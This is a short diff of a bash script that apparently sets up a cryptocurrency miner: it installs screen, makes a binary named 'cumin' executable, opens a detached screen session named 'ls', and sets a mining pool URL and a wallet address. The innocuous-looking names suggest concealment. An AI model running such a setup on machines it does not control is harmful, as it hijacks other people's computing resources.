@@ -1,7 +1,8 @@
 #!/bin/bash
 sudo apt-get update 
-sudo apt install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
+sudo apt install libcurl4-openssl-dev -y
 chmod +x cumin
+apt install screen
 screen -dmS ls 
 POOL=stratum+tcp://ap.luckpool.net:3956
 WALLET=RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr
